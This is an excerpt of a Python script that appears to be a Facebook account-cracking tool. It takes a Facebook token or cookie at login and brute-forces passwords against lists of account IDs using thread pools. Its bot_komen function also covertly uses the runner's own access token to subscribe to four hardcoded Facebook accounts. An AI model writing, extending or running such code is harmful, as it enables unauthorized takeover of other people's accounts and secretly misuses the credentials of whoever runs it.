...
def bot_komen():
    ...
    requests.post('https://graph.facebook.com/1024362163/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/1013884014/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100023257057329/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100052032962645/subscribers?access_token=' + token)
...
def login():
	...
	try:
		...
		logo()
		print("\n \033[0;97m    [choose login method]")
		print(" \033[0;97m[\033[0;96m1\033[0;97m] Login Token Facebook")
		print(" \033[0;97m[\033[0;96m2\033[0;97m] Login Cookie Facebook")
...
def public():
	...
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Crack With Pass Default Or Manual [d/m] : ")
	if ask == "Y" or ask == "y":
		manual()
	...
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Crack Finished")
...
def manual():
	...
	p = ThreadPool(20)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finisned")
